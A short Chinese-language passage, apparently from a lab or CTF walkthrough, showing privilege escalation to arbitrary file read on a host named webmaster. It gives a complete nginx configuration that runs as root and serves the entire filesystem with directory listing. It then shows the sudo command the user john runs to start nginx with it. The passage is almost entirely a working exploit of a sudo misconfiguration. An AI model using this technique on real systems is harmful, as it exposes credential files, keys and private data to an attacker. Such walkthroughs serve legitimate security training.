尝试提权至任意文件读取​

结合 nginx 的特性，尝试将根目录进行映射

user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 8080;
        root /;
        autoindex on;
    }
}

然后使用此配置文件启动 nginx

(remote) john@webmaster:/home/john$ sudo /usr/sbin/nginx -c /home/john/root.conf

即可实现任意文件读取
